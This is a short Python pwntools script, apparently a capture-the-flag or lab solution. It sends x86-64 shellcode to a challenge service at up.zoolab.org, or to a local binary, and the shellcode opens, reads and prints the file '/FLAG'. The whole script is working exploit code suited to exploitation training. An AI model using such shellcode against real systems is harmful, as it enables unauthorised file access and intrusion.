#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import sys

context.arch = 'amd64'
context.os = 'linux'

exe = './shellcode'
port = 12341

elf = ELF(exe)
off_main = elf.symbols.get(b'main', 0)
base = 0
qemu_base = 0

r = None
if 'local' in sys.argv[1:]:
    r = process(exe, shell=False)
elif 'qemu' in sys.argv[1:]:
    qemu_base = 0x4000000000
    r = process(f'qemu-x86_64-static {exe}', shell=True)
else:
    r = remote('up.zoolab.org', port)


# Syscall rdi, rsi, rdx, r10, r8, r9

shellcode = asm("""
    /* open("/FLAG", O_RDONLY) */
    xor rax, rax
    push rax
    mov rbx, 0x47414c462f
    push rbx
    mov rdi, rsp
    xor rsi, rsi
    mov rax, 2
    syscall

    /* read(fd, rsp-0x100, 0x100) */
    mov rdi, rax
    sub rsp, 0x100
    mov rsi, rsp
    mov rdx, 0x100
    xor rax, rax
    syscall

    /* write(1, rsp, 0x100) */
    mov rdi, 1
    mov rax, 1
    syscall

    /* exit(0) */
    mov rax, 60
    xor rdi, rdi
    syscall
""")

r.recvuntil(b'code> ')
r.send(shellcode)

r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :